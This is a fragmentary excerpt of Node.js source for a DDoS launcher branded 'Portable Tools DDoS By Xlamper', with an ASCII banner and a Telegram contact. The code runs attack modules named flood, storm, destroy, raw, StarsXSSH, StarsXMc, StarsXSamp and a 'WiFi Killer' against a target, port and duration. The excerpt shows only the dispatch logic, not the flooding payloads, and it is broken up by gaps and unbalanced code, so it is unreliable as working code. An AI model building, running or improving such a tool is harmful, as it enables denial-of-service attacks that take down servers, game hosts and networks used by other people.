...
⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⠿⠿⠋⠀⠀⠀⠀WhatsApp: ?????
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀Telegram: @Xlamper
⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⡄Portable Tools DDoS By Xlamper
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⢀⡾⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣷⣶⣴⣾⠏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠋⠁⠀⠀⠀⠀
========================================================================`)}
...
const wifiPath = path.join(__dirname, `/lib/StarsXWiFi`);
const startKillwiFi = spawn('node', [wifiPath]);
console.log(`
WiFi Killer Has Started
Type exit To Stop
`);
permen.question('[\x1b[1m\x1b[31mXlamper Wifi Killer\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
   ...
   exec(`node ${metode} ${target} ${duration}`)
    ...
    sigma()
      ...
      sigma()
       ...
       pushOngoing(target, methods, duration)
const destroy = path.join(__dirname, `/lib/destroy`);
const storm = path.join(__dirname, `/lib/storm`);
const rape = path.join(__dirname, `/lib/rape`);
...
const metode = path.join(__dirname, `/lib/StarsXSSH`);
...
const metode = path.join(__dirname, `/lib/StarsXTemp`);
exec(`node ${metode} +${target} ${duration}`)
sigma()
};
// [========================================] //
...
const raw = path.join(__dirname, `/lib/raw`);
const flood = path.join(__dirname, `/lib/flood`);
const ssh = path.join(__dirname, `/lib/StarsXSSH`);
...
const metode = path.join(__dirname, `/lib/StarsXMc`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
...
const metode = path.join(__dirname, `/lib/StarsXSamp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
